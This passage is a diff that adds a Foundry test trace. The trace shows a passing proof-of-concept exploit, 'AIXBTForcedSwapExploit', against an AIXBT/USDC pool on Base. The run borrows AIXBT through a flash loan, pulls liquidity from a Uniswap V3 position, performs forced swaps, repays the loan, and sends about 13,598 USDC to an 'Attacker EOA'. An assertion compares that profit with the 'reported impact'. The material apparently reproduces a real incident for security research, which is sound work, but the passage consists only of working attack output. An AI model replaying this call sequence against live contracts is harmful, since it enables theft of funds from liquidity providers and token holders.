+    │   │   │   │   │   │   @ 0xae2d21d24d11f0b73917b07cba5372aaf49a7303580b69ac0d8195e5e0ecdd00: 0x00000000000000000000000000000000000000000000006cb268fd48e800aebd → 0
+    │   │   │   │   │   │   @ 0x7733a14d9b6f4bc9fa392b7954a5ed168b3ef3cc0ebe2549bf5ab1b74cfdca0a: 0x0167966343000000000000000000000000000000000000000000000000000000 → 0
+    │   │   │   │   │   │   @ 0xae2d21d24d11f0b73917b07cba5372aaf49a7303580b69ac0d8195e5e0ecdd01: 0 → 0x00000000000000000000000000000000000001ed4b984137538effcc67940fd1
+    │   │   │   │   │   │   @ 4: 0x00000000000000000000000000000000000000000000006cb268fd48e800aebd → 0
+    │   │   │   │   │   └─ ← [Return] 2302717261408822841 [2.302e18], 7699924203452039651 [7.699e18]
+    │   │   │   │   ├─ [1013] 0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45::positions(0x1dc0994566c2842a9f5e15e5b9774e1fe9dd5ad5e4b2d883a038cdd7e270cc8d) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0, 39082879559967914078992262762449 [3.908e31], 0, 2302947556164439284 [2.302e18], 7699924203452039651 [7.699e18]
+    │   │   │   │   ├─ emit DecreaseLiquidity(tokenId: 1944700 [1.944e6], liquidity: 2005104163586532486845 [2.005e21], amount0: 2302717261408822841 [2.302e18], amount1: 7699924203452039651 [7.699e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0670f4c9f47719943e83bb00037b25e87bf657f2a3bfe5ccc5c6dbb7f81a29b8: 0x000000000000006cb268fd48e800aebd000000ffff9c00000000000000026585 → 0x00000000000000000000000000000000000000ffff9c00000000000000026585
+    │   │   │   │   │   @ 0x0670f4c9f47719943e83bb00037b25e87bf657f2a3bfe5ccc5c6dbb7f81a29bb: 0 → 0x00000000000000006adba044603101e300000000000000001ff5b699cd890cf4
+    │   │   │   │   │   @ 0x0670f4c9f47719943e83bb00037b25e87bf657f2a3bfe5ccc5c6dbb7f81a29b9: 0 → 0x00000000000000000000000000000000000001ed4b984137538effcc67940fd1
+    │   │   │   │   └─ ← [Return] 2302717261408822841 [2.302e18], 7699924203452039651 [7.699e18]
+    │   │   │   ├─ [65605] Uniswap V3 position manager::collect(CollectParams({ tokenId: 1944700 [1.944e6], recipient: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, amount0Max: 340282366920938463463374607431768211455 [3.402e38], amount1Max: 340282366920938463463374607431768211455 [3.402e38] }))
+    │   │   │   │   ├─ [57964] 0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45::collect(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], -100, 0, 2302947556164439284 [2.302e18], 7699924203452039651 [7.699e18])
+    │   │   │   │   │   ├─ [24901] WETH::transfer(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2302947556164439284 [2.302e18])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45, to: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 2302947556164439284 [2.302e18])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0 → 0x0000000000000000000000000000000000000000000000001ff5b699cd890cf4
+    │   │   │   │   │   │   │   @ 0xc8c5ec261a32bfe85b2205630de4faf4edad1c47b6f4f09849ae3f2c0cdb9c65: 0x0000000000000000000000000000000000000000000000001ff5b699cd890cf6 → 2
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [25738] AIXBT::transfer(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 7699924203452039651 [7.699e18])
+    │   │   │   │   │   │   ├─ [25560] 0x082Cb6e892Dd0699B5f0d22f7D2e638BBAdA5D94::transfer(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 7699924203452039651 [7.699e18]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x151D156DF6eDcdB6e63f83eBe4a13f8079C1eb45, to: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 7699924203452039651 [7.699e18])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xb5ae290dd1017f895f82e1b86f6350af72a7a6438e213d91c05c13d41e59d8f4: 0x0000000000000000000000000000000000000000000000006adba044603101e4 → 1
+    │   │   │   │   │   │   │   │   @ 0x4d938140bc095b7c14e17eec33593c01f72bbbf72ddd8406fe39f1194579ec6b: 0 → 0x0000000000000000000000000000000000000000000000006adba044603101e3
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ emit Collect(owner: Uniswap V3 position manager: [0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1], recipient: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], tickLower: -100, tickUpper: 0, amount0: 2302947556164439284 [2.302e18], amount1: 7699924203452039651 [7.699e18])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xae2d21d24d11f0b73917b07cba5372aaf49a7303580b69ac0d8195e5e0ecdd03: 0x00000000000000006adba044603101e300000000000000001ff5b699cd890cf4 → 0
+    │   │   │   │   │   └─ ← [Return] 2302947556164439284 [2.302e18], 7699924203452039651 [7.699e18]
+    │   │   │   │   ├─ emit Collect(tokenId: 1944700 [1.944e6], recipient: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount0: 2302947556164439284 [2.302e18], amount1: 7699924203452039651 [7.699e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0670f4c9f47719943e83bb00037b25e87bf657f2a3bfe5ccc5c6dbb7f81a29bb: 0x00000000000000006adba044603101e300000000000000001ff5b699cd890cf4 → 0
+    │   │   │   │   └─ ← [Return] 2302947556164439284 [2.302e18], 7699924203452039651 [7.699e18]
+    │   │   │   ├─ [849] AIXBT::balanceOf(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   ├─ [677] 0x082Cb6e892Dd0699B5f0d22f7D2e638BBAdA5D94::balanceOf(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 7699924203452039651 [7.699e18]
+    │   │   │   │   └─ ← [Return] 7699924203452039651 [7.699e18]
+    │   │   │   ├─ [1250] USDC::balanceOf(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   ├─ [553] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::balanceOf(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 6002759998 [6.002e9]
+    │   │   │   │   └─ ← [Return] 6002759998 [6.002e9]
+    │   │   │   ├─ [82247] Uniswap V3 swap router::exactOutputSingle(ExactOutputSingleParams({ tokenIn: 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913, tokenOut: 0x4F9Fd6Be4a90f2620860d680c0d4d5Fb53d1A825, fee: 10000 [1e4], recipient: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, amountOut: 2330075796547960349 [2.33e18], amountInMaximum: 6002759998 [6.002e9], sqrtPriceLimitX96: 0 }))
+    │   │   │   │   ├─ [74608] 0x853f59560DC170d59d27a45557e0F32A73EeDbE4::swap(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], false, -2330075796547960349 [-2.33e18], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000002b4f9fd6be4a90f2620860d680c0d4d5fb53d1a825002710833589fcd6edb6e08f4c7c32d4f71b54bda02913000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [12638] AIXBT::transfer(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2330075796547960349 [2.33e18])
+    │   │   │   │   │   │   ├─ [12460] 0x082Cb6e892Dd0699B5f0d22f7D2e638BBAdA5D94::transfer(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2330075796547960349 [2.33e18]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x853f59560DC170d59d27a45557e0F32A73EeDbE4, to: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 2330075796547960349 [2.33e18])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xf83541672529633d3b357207c9ec954c80e6e387937de58bd81de27b6d6e445f: 0x0000000000000000000000000000000000000000000001bd76ed9b30daf3b6b7 → 0x0000000000000000000000000000000000000000000001bd5697839961f9b89a
+    │   │   │   │   │   │   │   │   @ 0x4d938140bc095b7c14e17eec33593c01f72bbbf72ddd8406fe39f1194579ec6b: 0x0000000000000000000000000000000000000000000000006adba044603101e3 → 0x0000000000000000000000000000000000000000000000008b31b7dbd92b0000
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [3250] USDC::balanceOf(0x853f59560DC170d59d27a45557e0F32A73EeDbE4) [staticcall]
+    │   │   │   │   │   │   ├─ [2553] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::balanceOf(0x853f59560DC170d59d27a45557e0F32A73EeDbE4) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 2527352940 [2.527e9]
+    │   │   │   │   │   │   └─ ← [Return] 2527352940 [2.527e9]
+    │   │   │   │   │   ├─ [18394] Uniswap V3 swap router::uniswapV3SwapCallback(-2330075796547960349 [-2.33e18], 1427628 [1.427e6], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000002b4f9fd6be4a90f2620860d680c0d4d5fb53d1a825002710833589fcd6edb6e08f4c7c32d4f71b54bda02913000000000000000000000000000000000000000000)
+    │   │   │   │   │   │   ├─ [9228] USDC::transferFrom(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x853f59560DC170d59d27a45557e0F32A73EeDbE4, 1427628 [1.427e6])
+    │   │   │   │   │   │   │   ├─ [8554] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::transferFrom(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x853f59560DC170d59d27a45557e0F32A73EeDbE4, 1427628 [1.427e6]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x853f59560DC170d59d27a45557e0F32A73EeDbE4, value: 1427628 [1.427e6])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x67c2cc3f4367e07c4f8617fe0afa81708f63cbdc77d16f5d25dc0b1d3437fcef: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffea3753
+    │   │   │   │   │   │   │   │   │   @ 0x21d5e24f2a174eb8bd56f8dc9c203771022dc3aab2beb88b8986d284d3bebbcd: 0x0000000000000000000000000000000000000000000000000000000096a4586c → 0x0000000000000000000000000000000000000000000000000000000096ba2118
+    │   │   │   │   │   │   │   │   │   @ 0xd5a3747ee31d3fd63e41cb739b082a09bdc30756b64987e2144484efdf2892c3: 0x0000000000000000000000000000000000000000000000000000000165cad93e → 0x0000000000000000000000000000000000000000000000000000000165b51092
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0x000000000000000000000000000000000000000000000000000000000015c8ac
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [1250] USDC::balanceOf(0x853f59560DC170d59d27a45557e0F32A73EeDbE4) [staticcall]
+    │   │   │   │   │   │   ├─ [553] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::balanceOf(0x853f59560DC170d59d27a45557e0F32A73EeDbE4) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 2528780568 [2.528e9]
+    │   │   │   │   │   │   └─ ← [Return] 2528780568 [2.528e9]
+    │   │   │   │   │   ├─ emit Swap(sender: Uniswap V3 swap router: [0x2626664c2603336E57B271c5C0b26F421741e481], recipient: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], deltaQty0: -2330075796547960349 [-2.33e18], deltaQty1: 1427628 [1.427e6], sqrtP: 61709919037654682645233 [6.17e22], liquidity: 11114991482894541 [1.111e16], currentTick: -281323 [-2.813e5])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 8: 0x01000e3900000000045fc77023376966b753df5275fffe7bcd52c0f2679661ef → 0x01000e3900000000045fd00c5485a108020c7517f4fffe7bc79f3cda67966343
+    │   │   │   │   │   │   @ 2: 0x000000000000000000000000000000000000012f2615108399b0a660fc6cfea0 → 0x000000000000000000000000000000000000012f277e9d278cff4da962fe1341
+    │   │   │   │   │   │   @ 0: 0x000100000100010000fbb512000000000000000000000d10c159ed1c79a8dc58 → 0x000100000100010000fbb515000000000000000000000d114d297b9552a532f1
+    │   │   │   │   │   └─ ← [Return] -2330075796547960349 [-2.33e18], 1427628 [1.427e6]
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0: 0x000000000000000000000000000000000000000000000000000000000015c8ac → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   └─ ← [Return] 1427628 [1.427e6]
+    │   │   │   ├─ [457] WETH::balanceOf(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 2302947556164439284 [2.302e18]
+    │   │   │   ├─ [71655] Uniswap V3 swap router::exactInputSingle(ExactInputSingleParams({ tokenIn: 0x4200000000000000000000000000000000000006, tokenOut: 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913, fee: 3000, recipient: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f, amountIn: 2302947556164439284 [2.302e18], amountOutMinimum: 0, sqrtPriceLimitX96: 0 }))
+    │   │   │   │   ├─ [64259] 0x6c561B446416E1A00E8E93E221854d6eA4171372::swap(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], true, 2302947556164439284 [2.302e18], 4295128740 [4.295e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000002b4200000000000000000000000000000000000006000bb8833589fcd6edb6e08f4c7c32d4f71b54bda02913000000000000000000000000000000000000000000)
+    │   │   │   │   │   ├─ [10163] USDC::transfer(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 7597463305 [7.597e9])
+    │   │   │   │   │   │   ├─ [9463] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::transfer(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 7597463305 [7.597e9]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x6c561B446416E1A00E8E93E221854d6eA4171372, to: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 7597463305 [7.597e9])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x63621eeb68421bb8c935c4f91d8963aedae3e96c32ab21911c0315f3314fa0e4: 0x000000000000000000000000000000000000000000000000000000e96d937ab6 → 0x000000000000000000000000000000000000000000000000000000e7a8bb63ad
+    │   │   │   │   │   │   │   │   @ 0xd5a3747ee31d3fd63e41cb739b082a09bdc30756b64987e2144484efdf2892c3: 0x0000000000000000000000000000000000000000000000000000000165b51092 → 0x000000000000000000000000000000000000000000000000000000032a8d279b
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [2457] WETH::balanceOf(0x6c561B446416E1A00E8E93E221854d6eA4171372) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 425123103983831253353 [4.251e20]
+    │   │   │   │   │   ├─ [10157] Uniswap V3 swap router::uniswapV3SwapCallback(2302947556164439284 [2.302e18], -7597463305 [-7.597e9], 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000400000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000002b4200000000000000000000000000000000000006000bb8833589fcd6edb6e08f4c7c32d4f71b54bda02913000000000000000000000000000000000000000000)
+    │   │   │   │   │   │   ├─ [6064] WETH::transferFrom(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x6c561B446416E1A00E8E93E221854d6eA4171372, 2302947556164439284 [2.302e18])
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x6c561B446416E1A00E8E93E221854d6eA4171372, value: 2302947556164439284 [2.302e18])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xbd6180f29eae1c73dceab4ad58cb3a0d440e67a2aa8fed45d76606c1df8a60c9: 0x0000000000000000000000000000000000000000000000170bc4aaacafb68169 → 0x0000000000000000000000000000000000000000000000172bba61467d3f8e5d
+    │   │   │   │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x0000000000000000000000000000000000000000000000001ff5b699cd890cf4 → 0
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [457] WETH::balanceOf(0x6c561B446416E1A00E8E93E221854d6eA4171372) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 427426051539995692637 [4.274e20]
+    │   │   │   │   │   ├─ emit Swap(sender: Uniswap V3 swap router: [0x2626664c2603336E57B271c5C0b26F421741e481], recipient: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], deltaQty0: 2302947556164439284 [2.302e18], deltaQty1: -7597463305 [-7.597e9], sqrtP: 4556601283851545354857415 [4.556e24], liquidity: 344470882039841659 [3.444e17], currentTick: -195280 [-1.952e5])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0: 0x000100006400640042fd053700000000000000000003c54493f9b2b9d73713d4 → 0x000100006400640043fd053000000000000000000003c4e5d9bdfab403166bc7
+    │   │   │   │   │   │   @ 75: 0x0100061e78000001ed8415a0115a96549469427214fff93ad9e59a2e6795d021 → 0x0100061e78000001ed8432423108203b6df890f834fff939238b088c67966343
+    │   │   │   │   │   │   @ 1: 0x000000000000000000000000000004c7f06867392ad2597db58a6f86556e0a21 → 0x000000000000000000000000000004c7f58ad1a0376296a7645ff658ba5aab4c
+    │   │   │   │   │   └─ ← [Return] 2302947556164439284 [2.302e18], -7597463305 [-7.597e9]
+    │   │   │   │   └─ ← [Return] 7597463305 [7.597e9]
+    │   │   │   ├─ [5838] AIXBT::transfer(AIXBT/USDC flash pool: [0xf1Fdc83c3A336bdbDC9fB06e318B08EadDC82FF4], 10030000000000000000 [1.003e19])
+    │   │   │   │   ├─ [5660] 0x082Cb6e892Dd0699B5f0d22f7D2e638BBAdA5D94::transfer(AIXBT/USDC flash pool: [0xf1Fdc83c3A336bdbDC9fB06e318B08EadDC82FF4], 10030000000000000000 [1.003e19]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: AIXBT/USDC flash pool: [0xf1Fdc83c3A336bdbDC9fB06e318B08EadDC82FF4], value: 10030000000000000000 [1.003e19])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x4d938140bc095b7c14e17eec33593c01f72bbbf72ddd8406fe39f1194579ec6b: 0x0000000000000000000000000000000000000000000000008b31b7dbd92b0000 → 0
+    │   │   │   │   │   │   @ 0x87140ad5d6c04fa51ab2efc22332abe29a9931c2869c76aff0299bccafeb6adb: 0x0000000000000000000000000000000000000000000e0adc139a6aba9becc123 → 0x0000000000000000000000000000000000000000000e0adc9ecc22967517c123
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [1250] USDC::balanceOf(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   ├─ [553] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::balanceOf(AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 13598795675 [1.359e10]
+    │   │   │   │   └─ ← [Return] 13598795675 [1.359e10]
+    │   │   │   ├─ [25263] USDC::transfer(Attacker EOA: [0x312B559b41139c75a75c7aE1ea4454e661a02647], 13598795675 [1.359e10])
+    │   │   │   │   ├─ [24563] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::transfer(Attacker EOA: [0x312B559b41139c75a75c7aE1ea4454e661a02647], 13598795675 [1.359e10]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: Attacker EOA: [0x312B559b41139c75a75c7aE1ea4454e661a02647], value: 13598795675 [1.359e10])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xd5a3747ee31d3fd63e41cb739b082a09bdc30756b64987e2144484efdf2892c3: 0x000000000000000000000000000000000000000000000000000000032a8d279b → 0
+    │   │   │   │   │   │   @ 0x2b9fe65bf50a4d776029382326f5590a4319f53c3a2d8a83b9ad7a7c390e54ae: 0 → 0x000000000000000000000000000000000000000000000000000000032a8d279b
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [849] AIXBT::balanceOf(AIXBT/USDC flash pool: [0xf1Fdc83c3A336bdbDC9fB06e318B08EadDC82FF4]) [staticcall]
+    │   │   │   ├─ [677] 0x082Cb6e892Dd0699B5f0d22f7D2e638BBAdA5D94::balanceOf(AIXBT/USDC flash pool: [0xf1Fdc83c3A336bdbDC9fB06e318B08EadDC82FF4]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 16976254865688503845896483 [1.697e25]
+    │   │   │   └─ ← [Return] 16976254865688503845896483 [1.697e25]
+    │   │   ├─ [1250] USDC::balanceOf(AIXBT/USDC flash pool: [0xf1Fdc83c3A336bdbDC9fB06e318B08EadDC82FF4]) [staticcall]
+    │   │   │   ├─ [553] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::balanceOf(AIXBT/USDC flash pool: [0xf1Fdc83c3A336bdbDC9fB06e318B08EadDC82FF4]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 707957366111 [7.079e11]
+    │   │   │   └─ ← [Return] 707957366111 [7.079e11]
+    │   │   ├─ emit Flash(sender: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], recipient: AIXBTForcedSwapExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], qty0: 10000000000000000000 [1e19], qty1: 0, paid0: 30000000000000000 [3e16], paid1: 0)
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0x00000000000000000000000000071751b1b8d59273edd5d480bd8078d0975a68 → 0x00000000000000000000000000071751b2229e69a8815c9c187073c545444f0d
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [1250] USDC::balanceOf(Attacker EOA: [0x312B559b41139c75a75c7aE1ea4454e661a02647]) [staticcall]
+    │   ├─ [553] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::balanceOf(Attacker EOA: [0x312B559b41139c75a75c7aE1ea4454e661a02647]) [delegatecall]
+    │   │   └─ ← [Return] 13598795675 [1.359e10]
+    │   └─ ← [Return] 13598795675 [1.359e10]
+    ├─ emit log_named_decimal_uint(key: "Attacker USDC profit", val: 13598795675 [1.359e10], decimals: 6)
+    ├─ [0] VM::assertGt(13598795675 [1.359e10], 13000000000 [1.3e10], "USDC profit below reported impact") [staticcall]
+    │   └─ ← [Return]
+    ├─ [1781] USDC::symbol() [staticcall]
+    │   ├─ [1081] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::symbol() [delegatecall]
+    │   │   └─ ← [Return] "USDC"
+    │   └─ ← [Return] "USDC"
+    ├─ [1250] USDC::balanceOf(Attacker EOA: [0x312B559b41139c75a75c7aE1ea4454e661a02647]) [staticcall]
+    │   ├─ [553] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::balanceOf(Attacker EOA: [0x312B559b41139c75a75c7aE1ea4454e661a02647]) [delegatecall]
+    │   │   └─ ← [Return] 13598795675 [1.359e10]
+    │   └─ ← [Return] 13598795675 [1.359e10]
+    ├─ [1043] USDC::decimals() [staticcall]
+    │   ├─ [381] 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779::decimals() [delegatecall]
+    │   │   └─ ← [Return] 6
+    │   └─ ← [Return] 6
+    ├─ emit log_named_decimal_uint(key: "Attacker After exploit USDC Balance", val: 13598795675 [1.359e10], decimals: 6)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 28.10s (26.61s CPU time)
+
+Ran 1 test suite in 28.65s (28.10s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
